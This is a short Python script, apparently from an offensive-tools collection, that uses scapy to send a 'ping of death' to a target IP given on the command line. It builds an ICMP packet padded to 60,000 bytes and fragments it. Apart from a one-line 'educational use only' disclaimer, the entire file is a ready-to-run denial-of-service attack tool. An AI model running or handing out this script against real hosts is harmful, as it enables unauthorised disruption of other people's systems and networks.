#!/usr/bin/python

# This tool is for educational use only!

# Description: Ping of death

# Requirements: scapy + root privileges

import sys
from scapy.all import send, fragment, IP, ICMP

if len(sys.argv) < 2:
  print "{0} <dst_ip>".format(sys.argv[0])
  sys.exit(1)

send(fragment(IP(dst=sys.argv[1]) / ICMP()  / ("X"*60000)))
